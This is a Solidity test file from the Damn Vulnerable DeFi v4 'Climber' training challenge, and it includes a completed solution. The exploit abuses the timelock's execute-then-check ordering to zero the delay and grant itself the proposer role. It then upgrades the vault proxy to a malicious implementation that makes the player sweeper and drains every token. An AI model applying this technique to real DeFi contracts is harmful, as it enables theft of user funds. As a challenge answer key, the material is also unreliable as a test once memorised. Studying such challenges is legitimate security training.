// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
import {CallerNotSweeper, InvalidWithdrawalAmount, InvalidWithdrawalTime} from "../../src/climber/ClimberErrors.sol";
import {ADMIN_ROLE, PROPOSER_ROLE, MAX_TARGETS, MIN_TARGETS, MAX_DELAY} from "../../src/climber/ClimberConstants.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;
    AttackerContract attackerContract;
    bytes data;

    address[4] public targets_array;
    uint256[4] public values_array;
    bytes[4] public dataElements_array;
    bytes32 salt = bytes32(uint256(15));

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        attackerContract = new AttackerContract();

        (address[] memory _targets, uint256[] memory _values, bytes[] memory _dataElements) = dataForCall();

        timelock.execute(_targets, _values, _dataElements, salt);

        AttackerContract(address(vault)).sweepFunds(address(token), recovery);
    }

    function schedule() public {
        (address[] memory _targets, uint256[] memory _values, bytes[] memory _dataElements) = dataForCall();
        timelock.schedule(_targets, _values, _dataElements, salt);
    }

    function dataForCall() internal returns (address[] memory, uint256[] memory, bytes[] memory) {
        data = abi.encodeWithSignature("initialize(address)", player);

        address[] memory targets = new address[](4);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(vault);
        targets[3] = address(this);

        uint256[] memory values = new uint256[](4);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;

        bytes[] memory dataElements = new bytes[](4);

        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        dataElements[2] = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)", address(attackerContract), data, VAULT_TOKEN_BALANCE
        );
        dataElements[3] = abi.encodeWithSignature("schedule()");

        return (targets, values, dataElements);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

contract AttackerContract is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    modifier onlySweeper() {
        if (msg.sender != _sweeper) {
            revert CallerNotSweeper();
        }
        _;
    }

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function initialize(address player) external reinitializer(2) {
        // Initialize inheritance chain
        __Ownable_init(player);
        __UUPSUpgradeable_init();

        _setSweeper(player);
    }

    // Allows trusted sweeper account to retrieve any tokens
    function sweepFunds(address token, address recovery) external onlySweeper {
        SafeTransferLib.safeTransfer(token, recovery, IERC20(token).balanceOf(address(this)));
    }

    function _setSweeper(address newSweeper) private {
        _sweeper = newSweeper;
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}
